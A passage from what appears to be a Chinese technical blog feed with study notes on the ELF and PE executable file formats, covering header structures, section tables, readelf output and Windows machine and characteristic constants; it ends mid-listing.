Elf32_Half	e_shstrndx;		    <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure>
<h4 id="程序头表program-header-table">程序头表（program header table）</h4>
<p>列举了所有有效的段(segments)和他们的属性（执行视图）,链接视图是可选的，一般没有。</p>
<p>程序头是一个结构的数组，每一个结构都表示一个段(segments)。在可执行文件或者共享链接库中所有的节(sections)都被分为不同的几个段(segments)。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_phdr</span>&#123;</span></span><br><span class="line">	  Elf32_Word	p_type;    <span class="comment">/* Magic number and other info */</span></span><br><span class="line">	  Elf32_Off	p_offset;</span><br><span class="line">	  Elf32_Addr	p_vaddr;</span><br><span class="line">	  Elf32_Addr	p_paddr;</span><br><span class="line">	  Elf32_Word	p_filesz;</span><br><span class="line">	  Elf32_Word	p_memsz;</span><br><span class="line">	  Elf32_Word	p_flags;</span><br><span class="line">	  Elf32_Word	p_align;</span><br><span class="line">&#125; Elf32_Phdr;</span><br></pre></td></tr></table></figure>
<p>程序头的索引地址(e_phoff)、段数量(e_phnum)、表项大小(e_phentsize)都是通过 ELF头部信息获取的。</p>
<p>可通过<code>readelf -l</code>读取ELF程序头信息：</p>
<h4 id="节头表section-header-table">节头表（section header table）</h4>
<p>一个ELF文件中到底有哪些具体的 sections，由包含在这个ELF文件中的 section head table(SHT)决定。每个section描述了这个段的信息，比如每个段的段名、段的长度、在文件中的偏移、读写权限及段的其它属性。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_shdr</span>&#123;</span></span><br><span class="line">	    Elf32_Word sh_name;   <span class="comment">//节区名，名字是一个 NULL 结尾的字符串。</span></span><br><span class="line">	    Elf32_Word sh_type;    <span class="comment">//为节区类型</span></span><br><span class="line">	    Elf32_Word sh_flags;    <span class="comment">//节区标志</span></span><br><span class="line">	    Elf32_Addr sh_addr;    <span class="comment">//节区的第一个字节应处的位置。否则，此字段为 0。</span></span><br><span class="line">	    Elf32_Off sh_offset;    <span class="comment">//此成员的取值给出节区的第一个字节与文件头之间的偏移。</span></span><br><span class="line">	    Elf32_Word sh_size;   <span class="comment">//此 成 员 给 出 节 区 的 长 度 （ 字 节 数 ）。</span></span><br><span class="line">	    Elf32_Word sh_link;   <span class="comment">//此成员给出节区头部表索引链接。其具体的解释依赖于节区类型。</span></span><br><span class="line">	    Elf32_Word sh_info;       <span class="comment">//此成员给出附加信息，其解释依赖于节区类型。</span></span><br><span class="line">	    Elf32_Word sh_addralign;    <span class="comment">//某些节区带有地址对齐约束.</span></span><br><span class="line">	    Elf32_Word sh_entsize;    <span class="comment">//给出每个表项的长度字节数。</span></span><br><span class="line">&#125;Elf32_Shdr;</span><br></pre></td></tr></table></figure>
<p>节区名存储在.<a href="onenote:#elf加载过程&amp;section-id=%7B503CCFB6-C32E-4B72-8C67-CB9E878870BE%7D&amp;page-id=%7B934E7334-CB4A-4A41-814C-8742312D7636%7D&amp;object-id=%7BC81FF8EC-AF62-0DAD-105B-29D5DD1E0EA2%7D&amp;7D&amp;base-path=https://d.docs.live.net/aba64c6627629f31/文档/我的笔记本/源码整理/Linux内核学习/进程管理.one">shstrtab</a>字符串表中，sh_name是表中偏移。</p>
<p>可通过<strong>readelf -S</strong> 读取sections' header：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">There are 29 section headers, starting at offset 0xbf0f8:</span><br><span class="line"></span><br><span class="line">节头：</span><br><span class="line">  [号] 名称              类型             地址              偏移量</span><br><span class="line">       大小              全体大小          旗标   链接   信息   对齐</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .note.gnu.bu[...] NOTE             0000000000400200  00000200</span><br><span class="line">       0000000000000024  0000000000000000   A       0     0     4</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE             0000000000400224  00000224</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     4</span><br><span class="line">  [ 3] .rela.plt         RELA             0000000000400248  00000248</span><br><span class="line">       0000000000000240  0000000000000018  AI       0    18     8</span><br><span class="line">  [ 4] .init             PROGBITS         0000000000401000  00001000</span><br><span class="line">       0000000000000017  0000000000000000  AX       0     0     4</span><br><span class="line">  [ 5] .plt              PROGBITS         0000000000401018  00001018</span><br><span class="line">       00000000000000c0  0000000000000000  AX       0     0     8</span><br><span class="line">  [ 6] .text             PROGBITS         00000000004010e0  000010e0</span><br><span class="line">       000000000007ef60  0000000000000000  AX       0     0     16</span><br><span class="line">  [ 7] __libc_freeres_fn PROGBITS         0000000000480040  00080040</span><br><span class="line">       0000000000000a66  0000000000000000  AX       0     0     16</span><br><span class="line">  [ 8] .fini             PROGBITS         0000000000480aa8  00080aa8</span><br><span class="line">       0000000000000009  0000000000000000  AX       0     0     4</span><br><span class="line">  [ 9] .rodata           PROGBITS         0000000000481000  00081000</span><br><span class="line">       000000000001c61c  0000000000000000   A       0     0     32</span><br><span class="line">  [10] .eh_frame         PROGBITS         000000000049d620  0009d620</span><br><span class="line">       000000000000a71c  0000000000000000   A       0     0     8</span><br><span class="line">  [11] .gcc_except_table PROGBITS         00000000004a7d3c  000a7d3c</span><br><span class="line">       00000000000000cf  0000000000000000   A       0     0     1</span><br><span class="line">  [12] .tdata            PROGBITS         00000000004a9000  000a8000</span><br><span class="line">       0000000000000020  0000000000000000 WAT       0     0     8</span><br><span class="line">  [13] .tbss             NOBITS           00000000004a9020  000a8020</span><br><span class="line">       0000000000000040  0000000000000000 WAT       0     0     8</span><br><span class="line">  [14] .init_array       INIT_ARRAY       00000000004a9020  000a8020</span><br><span class="line">       0000000000000010  0000000000000008  WA       0     0     8</span><br><span class="line">  [15] .fini_array       FINI_ARRAY       00000000004a9030  000a8030</span><br><span class="line">       0000000000000010  0000000000000008  WA       0     0     8</span><br><span class="line">  [16] .data.rel.ro      PROGBITS         00000000004a9040  000a8040</span><br><span class="line">       0000000000002ed4  0000000000000000  WA       0     0     32</span><br><span class="line">  [17] .got              PROGBITS         00000000004abf18  000aaf18</span><br><span class="line">       00000000000000e0  0000000000000000  WA       0     0     8</span><br><span class="line">  [18] .got.plt          PROGBITS         00000000004ac000  000ab000</span><br><span class="line">       00000000000000d8  0000000000000008  WA       0     0     8</span><br><span class="line">  [19] .data             PROGBITS         00000000004ac0e0  000ab0e0</span><br><span class="line">       0000000000001a50  0000000000000000  WA       0     0     32</span><br><span class="line">  [20] __libc_subfreeres PROGBITS         00000000004adb30  000acb30</span><br><span class="line">       0000000000000048  0000000000000000  WA       0     0     8</span><br><span class="line">  [21] __libc_IO_vtables PROGBITS         00000000004adb80  000acb80</span><br><span class="line">       0000000000000768  0000000000000000  WA       0     0     32</span><br><span class="line">  [22] __libc_atexit     PROGBITS         00000000004ae2e8  000ad2e8</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     8</span><br><span class="line">  [23] .bss              NOBITS           00000000004ae300  000ad2f0</span><br><span class="line">       0000000000001800  0000000000000000  WA       0     0     32</span><br><span class="line">  [24] __libc_freer[...] NOBITS           00000000004afb00  000ad2f0</span><br><span class="line">       0000000000000020  0000000000000000  WA       0     0     8</span><br><span class="line">  [25] .comment          PROGBITS         0000000000000000  000ad2f0</span><br><span class="line">       0000000000000027  0000000000000001  MS       0     0     1</span><br><span class="line">  [26] .symtab           SYMTAB           0000000000000000  000ad318</span><br><span class="line">       000000000000b3e8  0000000000000018          27   765     8</span><br><span class="line">  [27] .strtab           STRTAB           0000000000000000  000b8700</span><br><span class="line">       00000000000068cf  0000000000000000           0     0     1</span><br><span class="line">  [28] .shstrtab         STRTAB           0000000000000000  000befcf</span><br><span class="line">       0000000000000128  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  l (large), p (processor specific)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr class="header">
<th>sh_name</th>
<th>sh_type</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>.text</td>
<td>SHT_PROGBITS</td>
<td>代码段，包含程序的可执行指令</td>
</tr>
<tr class="even">
<td>.data</td>
<td>SHT_PROGBITS</td>
<td>包含初始化了的数据，将出现在程序的内存映像中</td>
</tr>
<tr class="odd">
<td>.bss</td>
<td>SHT_NOBITS</td>
<td>未初始化数据，因为只有符号所以</td>
</tr>
<tr class="even">
<td>.rodata</td>
<td>SHT_PROGBITS</td>
<td>包含只读数据</td>
</tr>
<tr class="odd">
<td>.comment</td>
<td>SHT_PROGBITS</td>
<td>包含版本控制信息</td>
</tr>
<tr class="even">
<td>.eh_frame</td>
<td>SHT_PROGBITS</td>
<td>它生成描述如何unwind 堆栈的表</td>
</tr>
<tr class="odd">
<td>.debug</td>
<td>SHT_PROGBITS</td>
<td>此节区包含用于符号调试的信息</td>
</tr>
<tr class="even">
<td>.dynsym</td>
<td>SHT_DYNSYM</td>
<td>此节区包含了动态链接符号表</td>
</tr>
<tr class="odd">
<td>.shstrtab</td>
<td>SHT_STRTAB</td>
<td>存放section名，字符串表。Section Header String Table</td>
</tr>
<tr class="even">
<td>.strtab</td>
<td>SHT_STRTAB</td>
<td>字符串表</td>
</tr>
<tr class="odd">
<td>.symtab</td>
<td>SHT_SYMTAB</td>
<td>符号表</td>
</tr>
<tr class="even">
<td>.got</td>
<td>SHT_PROGBITS</td>
<td>全局偏移表</td>
</tr>
<tr class="odd">
<td>.plt</td>
<td>SHT_PROGBITS</td>
<td>过程链接表</td>
</tr>
<tr class="even">
<td>.relname</td>
<td>SHT_REL</td>
<td>包含了重定位信息，例如 .text 节区的重定位节区名字将是：.rel.text</td>
</tr>
</tbody>
</table>
<p><em>1）.text 代码段</em></p>
<p>可以通过objdump -d 反汇编，查看ELF文件代码段内容。</p>
<p><em>2）.strtab / .shstrtab 字符串表</em></p>
<p>在ELF文件中，会用到很多字符串，比如节名，变量名等。所以ELF将所有的字符串集中放到一个表里，每一个字符串以’\0’分隔，然后使用字符串在表中的偏移来引用字符串。这样在ELF中引用字符串只需要给出一个数组下标即可。字符串表在ELF也以段的形式保存， .shstrtab是专供section name的字符串表。</p>
<p>可以用一下命令查看：readelf -S xxx.o</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Section Headers:  [Nr] Name              Type             Address           Offset       Size              EntSize          Flags  Link  Info  Align  [ 0]                   NULL             0000000000000000  00000000       0000000000000000  0000000000000000           0     0     0  [ 1] .text             PROGBITS         0000000000000000  00000040       0000000000000045  0000000000000000  AX       0     0     1  [ 2] .rela.text        RELA             0000000000000000  00000658       0000000000000048  0000000000000018          12     1     8  [ 3] .data             PROGBITS         0000000000000000  00000085       0000000000000000  0000000000000000  WA       0     0     1                         … …  [11] .shstrtab         STRTAB           0000000000000000  00000108       0000000000000074  0000000000000000           0     0     1  [12] .symtab           SYMTAB           0000000000000000  00000500       0000000000000138  0000000000000018          13    10     8  [13] .strtab           STRTAB           0000000000000000  00000638       000000000000001e  0000000000000000           0     0     1</span><br></pre></td></tr></table></figure>
<p><em>3）.symtab 符号表</em></p>
<p>在链接的过程中需要把多个不同的目标文件合并在一起，不同的目标文件相互之间会引用变量和函数。在链接过程中，我们将函数和变量统称为符号，函数名和变量名就是符号名。</p>
<p>每个定义的符号都有一个相应的值，叫做符号值(Symbol Value)，对于变量和函数，符号值就是它们的地址。</p>
<p>可以使用下面命令查看：readelf -s xxx.o</p>
<figure>
<img src="../images/ELF%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/v2-c9e476401c19307c82b3fe89e3555224_720w.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p><em>4）.eh_frame / .eh_frame_hdr</em></p>
<p>在调试程序的时候经常需要进行堆<strong>栈回溯</strong>，早期使用通用寄存器(ebp)来保存每层函数调用的栈帧地址，但局限性很大。后来现代Linux操作系统在LSB(Linux Standard Base)标准中定义了一个.eh_frame section，用来描述如何去unwind the stack。gcc编译器默认打开，如果不想把.eh_frame section编入elf文件，可以通过gcc选项 -fno-asynchronous-unwind-tables 去除。</p>
<p>GAS(GCC Assembler)汇编编译器定义了一组伪指令来协助eh_frame生成调用栈信息CFI(Call Frame Information)。具体原理在后续《栈回溯》章节分析，这里不再阐述。</p>
<p><em>5）重定位表（.relname）</em></p>
<p>链接器在处理目标文件时，需要对目标文件中的某些部位进行重定位，即代码段和数据中中那些绝对地址引用的位置。对于每个需要重定位的代码段或数据段，都会有一个相应的重定位表。比如”.rel.text”就是针对”.text”的重定位表，”.rel.data”就是针对”.data”的重定位表。</p>
<p>GOT是全局偏移表（ Global Offset Table），用于存储外部符号地址；PLT是程序链接表（Procedure Link Table），用于存储记录定位信息的额外代码。关于linux动态链接重定位原理，可以参考<a href="https://link.zhihu.com/?target=https%3A//linyt.blog.csdn.net/">海枫</a>写的《<a href="https://link.zhihu.com/?target=https%3A//blog.csdn.net/linyt/article/details/51635768">Linux动态链接中的PLT和GOT</a>》。</p>
<h2 id="相关命令">相关命令</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readelf -S relocfile //查看节头表objdump -x -s -d relocfile //查看.text汇编readelf -x .strtab relocfile //查看字符串表readelf -r file //查看重定位表</span><br></pre></td></tr></table></figure>
<h2 id="可执行文件的装载">可执行文件的装载</h2>
<p>当运行一个可执行文件时，首先需要将该文件和动态链接库装载到进程空间，形成一个进程镜像。</p>
<p>每个进程都有独立的虚拟地址空间，空间的布局由<strong>程序头（program header）</strong>决定，通过<code>readelf -l file</code>可以看到节到段的映射，以及段的地址空间布局。每一个段都包含一个或多个节，因为随着节数量的增多，在进行内存映射时就会大量浪费空间和资源。系统并不关心节的实际内容，而是不同节的读写、执行的权限。</p>
<h2 id="参考">参考</h2>
<p><a href="https://zhuanlan.zhihu.com/p/286088470">ELF文件格式 - 知乎 (zhihu.com)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/380180101">gcc 编译命令详解及最佳实践 - 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>PE文件格式</title>
    <url>/2022/07/02/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.html</url>
    <content><![CDATA[<h1 id="pe文件格式">PE文件格式</h1>
<h2 id="总体">总体</h2>
<p>PE即Portable Executable，是Windows OS下使用的可执行文件格式。PE文件是指32位的可执行文件，亦称为PE32。64位的可执行文件称为PE+或PE32+，是PE文件的一种扩展形式。</p>
<figure>
<img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702231319266-1023829015.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<h2 id="相关概念">相关概念</h2>
<ul>
<li>虚拟内存地址（Virtual Address, VA）PE文件中的指令被装入内存后的地址。</li>
<li>相对虚拟内存地址（Reverse Virtual Address, RVA相对虚拟地址是内存地址相对于映射基址的偏移量。</li>
<li>文件偏移地址（File Offset Address, FOA）数据在PE文件中的地址叫文件偏移地址，这是文件在磁盘上存放时相对于文件开头的偏移。</li>
<li>装在基址（Image base）PE装入内存时的基地址。默认情况下，EXE文件在内存中的基地址时0x00400000, DLL文件是0x10000000。这些位置可以通过修改编译选项更改。</li>
<li>虚拟内存地址、映射基址、相对虚拟内存地址的关系：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VA = Image Base + RVA</span><br></pre></td></tr></table></figure>
<ul>
<li>文件偏移是相对于文件开始处0字节的偏移，相对虚拟地址则是相对于装载基址0x00400000处的偏移。（1）PE文件中的数据按照磁盘数据标准存放，以0x200字节为基本单位进行组织，PE数据节的大小永远是0x200的整数倍。（2）当代码装入内存后，将按照内存数据标准存放，并以0x1000字节为基本单位进行组织，内存中的节总是0x1000的整数倍。</li>
<li>内存中数据节相对于装载基址的偏移量和文件中数据节的偏移量的差异称为节偏移。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件偏移地址 = 虚拟内存地址（VA） - 装载基址（Image Base） - 节偏移 </span><br><span class="line">             = RVA - 节偏移</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong>在可执行文件中，有相当多的地方需要指定内存的地址。例如：引用全局变量时，需要指定它的地址。PE文件尽管有一个<strong>首选的载入地址（基地址）</strong>,但是他们可以载入到<strong>进程空间的任意地方</strong>，所以<strong>不能依赖与PE的载入点</strong>。由于这个原因，必须有一个方法来指定一个地址而不是依赖于PE载入点。</p>
<h2 id="结构">结构</h2>
<h3 id="d0s部分">D0S部分</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                    <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;             <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure>
<p><strong>e_magic：一个WORD类型，值是一个常数0x4D5A，用文本编辑器查看该值位 MZ，可执行文件必须都是 MZ 开头。</strong></p>
<p><strong>e_lfanew：为32位可执行文件扩展的域，用来表示DOS头之后的PE头相对文件起始地址的偏移。</strong>直接指向PE文件头开头，是一个文件偏移地址，PE部分开头<strong>固定</strong>为‘’PE00‘’ 0x00004550。PE文件采用小端，低位放在低地址。大端是高位放在低地址。</p>
<p>18个 WORD 类型，一个 LONG 类型，WORD为2字节，LONG为4字节</p>
<p>18*2+4+24*2 = 64</p>
<p>DOS头的下面是DOS Stub。整个DOS Stub是一个字节块，其内容随着链接时使用的链接器不同而不同，PE中并没有与之对应的相关结构。常见里面有This program cannot run in dos mode</p>
<h3 id="pe文件头">PE文件头</h3>
<p>前四字节为PE文件头标志,可根据 DOS头的 e_lfanew 得到。（一个64位，一个32位）只有一个出现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS64</span> &#123;</span></span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure>
<p><code>DWORD Signature;</code>4字节，小端存储， 00004550 ，代表PE文件头标志 PE00</p>
<p><code>IMAGE_FILE_HEADER FileHeader;</code>20字节，代表PE文件表头</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Machine;</span><br><span class="line">    WORD    NumberOfSections;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    DWORD   PointerToSymbolTable;</span><br><span class="line">    DWORD   NumberOfSymbols;</span><br><span class="line">    WORD    SizeOfOptionalHeader;</span><br><span class="line">    WORD    Characteristics;</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>
<p><code>WORD Machine;</code>2字节，该文件的运行平台，是x86、x64还是I64等等，可以是下面值里的某一个。</p>
<p><code>WORD Machine;</code>2字节，该文件的运行平台，是x86、x64还是I64等等，可以是下面值里的某一个。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_UNKNOWN           0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_I386              0x014c  <span class="comment">// Intel 386.</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_R3000             0x0162  <span class="comment">// MIPS little-endian, 0x160 big-endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_R4000             0x0166  <span class="comment">// MIPS little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_R10000            0x0168  <span class="comment">// MIPS little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_WCEMIPSV2         0x0169  <span class="comment">// MIPS little-endian WCE v2</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_ALPHA             0x0184  <span class="comment">// Alpha_AXP</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_SH3               0x01a2  <span class="comment">// SH3 little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_SH3DSP            0x01a3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_SH3E              0x01a4  <span class="comment">// SH3E little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_SH4               0x01a6  <span class="comment">// SH4 little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_SH5               0x01a8  <span class="comment">// SH5</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_ARM               0x01c0  <span class="comment">// ARM Little-Endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_THUMB             0x01c2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AM33              0x01d3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_POWERPC           0x01F0  <span class="comment">// IBM PowerPC Little-Endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_POWERPCFP         0x01f1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_IA64              0x0200  <span class="comment">// Intel 64</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_MIPS16            0x0266  <span class="comment">// MIPS</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_ALPHA64           0x0284  <span class="comment">// ALPHA64</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_MIPSFPU           0x0366  <span class="comment">// MIPS</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_MIPSFPU16         0x0466  <span class="comment">// MIPS</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AXP64             IMAGE_FILE_MACHINE_ALPHA64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_TRICORE           0x0520  <span class="comment">// Infineon</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_CEF               0x0CEF</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_EBC               0x0EBC  <span class="comment">// EFI Byte Code</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AMD64             0x8664  <span class="comment">// AMD64 (K8)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_M32R              0x9041  <span class="comment">// M32R little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_CEE               0xC0EE</span></span><br></pre></td></tr></table></figure>
<p><code>WORD NumberOfSections;</code>2字节，该PE文件中有多少个节，也就是节表中的项数。即有多少区段表。对应.data .text等节</p>
<p><code>DWORD TimeDateStamp;</code>4字节，PE文件的<strong>创建时间</strong>，一般有连接器填写。 比如下图<code>3FCCF133</code>转换成十进制就是<code>1070395699</code>,也就是<code>2003-12-03 04:08:19</code>。注意此时间不会随着更改程序某些字节的变化而变化。</p>
<p><code>DWORD PointerToSymbolTable;</code>4 字节，COFF文件符号表在文件中的偏移，现在基本没用了，值位0。</p>
<p><code>DWORD NumberOfSymbols;</code>4 字节，符号表的数量。如果有COFF 符号表，它代表其中的符号数目，COFF符号是一个大小固定的结构，如果想找到COFF 符号表的结束位置，则需要这个变量。没有COFF，值为0.</p>
<p><code>WORD SizeOfOptionalHeader;</code>2字节，紧随其后的<strong>PE可选头</strong>的大小。下图为 00E0 即为32字节。</p>
<p><code>WORD Characteristics;</code>2字节，可执行文件的属性，，有选择的通过几个值可以运算得到。( 这些标志的有效值是定义于 winnt.h 内的 IMAGE_FILE_** 的值，具体含义见下表。普通的EXE文件这个字段的值一般是 0100h，DLL文件这个字段的值一般是 210Eh。)多种属性可以通过 “或运算” 使得同时拥有！2字节，对应16个符号位。</p>
<p>0100h，DLL文件这个字段的值一般是 210Eh。)多种属性可以通过 “或运算” 使得同时拥有！</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_RELOCS_STRIPPED           0x0001  <span class="comment">// Relocation info stripped from file.</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_EXECUTABLE_IMAGE          0x0002  <span class="comment">// File is executable  (i.e. no unresolved externel references).</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_LINE_NUMS_STRIPPED        0x0004  <span class="comment">// Line nunbers stripped from file.</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_LOCAL_SYMS_STRIPPED       0x0008  <span class="comment">// Local symbols stripped from file.</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_AGGRESIVE_WS_TRIM         0x0010  <span class="comment">// Agressively trim working set</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_LARGE_ADDRESS_AWARE       0x0020  <span class="comment">// App can handle &gt;2gb addresses</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_BYTES_REVERSED_LO         0x0080  <span class="comment">// Bytes of machine word are reversed.</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_32BIT_MACHINE             0x0100  <span class="comment">// 32 bit word machine.</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_DEBUG_STRIPPED            0x0200  <span class="comment">// Debugging info stripped from file in .DBG file</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP   0x0400  <span class="comment">// If Image is on removable media, copy and run from the swap file.</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_NET_RUN_FROM_SWAP         0x0800  <span class="comment">// If Image is on Net, copy and run from the swap file.</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_SYSTEM                    0x1000  <span class="comment">// System File.</span></span></span><br><span class="line">    <span class="meta">#<span 